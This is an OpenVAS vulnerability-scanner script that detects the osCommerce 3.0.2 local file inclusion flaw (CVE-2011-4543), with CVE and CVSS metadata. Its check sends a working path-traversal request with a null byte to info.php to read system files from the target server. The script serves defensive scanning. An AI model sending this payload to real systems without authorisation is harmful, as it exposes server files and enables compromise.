###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_oscommerce_50793.nasl 13 2013-10-27 12:16:33Z jan $
#
# osCommerce Multiple Local File Include Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "osCommerce is prone to multiple local file-include vulnerabilities
because it fails to properly sanitize user-supplied input.

An attacker can exploit this vulnerability to obtain potentially
sensitive information and execute arbitrary local scripts in the
context of the webserver process. This may allow the attacker to
compromise the application and the computer; other attacks are
also possible.

osCommerce 3.0.2 is vulnerable; prior versions may also be affected.";


if (description)
{
 script_id(103345);
 script_cve_id("CVE-2011-4543");
 script_bugtraq_id(50793);
 script_version ("$Revision: 13 $");

 script_name("osCommerce Multiple Local File Include Vulnerabilities");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/50793");
 script_xref(name : "URL" , value : "https://www.dognaedis.com/vulns/DGS-SEC-4.html");
 script_xref(name : "URL" , value : "http://www.oscommerce.com");

 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2011-11-24 09:57:26 +0100 (Thu, 24 Nov 2011)");
 script_description(desc);
 script_summary("Determine if installed osCommerce is vulnerable");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("oscommerce_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if( ! dir = get_dir_from_kb(port:port, app:"oscommerce")) exit(0);
dirs = make_list("/osCommerce","/"); # where to find the OM dir.
files = traversal_files();

foreach dir1 (dirs) {
  foreach file (keys(files)) {   
   
    url = string(dir, dir1, "/OM/Core/Site/Admin/Application/templates_modules/pages/info.php?set=",crap(data:"../", length:12*3),files[file],"%00&module=foo"); 

    if(http_vuln_check(port:port, url:url,pattern:file)) {
     
      security_hole(port:port);
      exit(0);

    }
  }
}

exit(0);
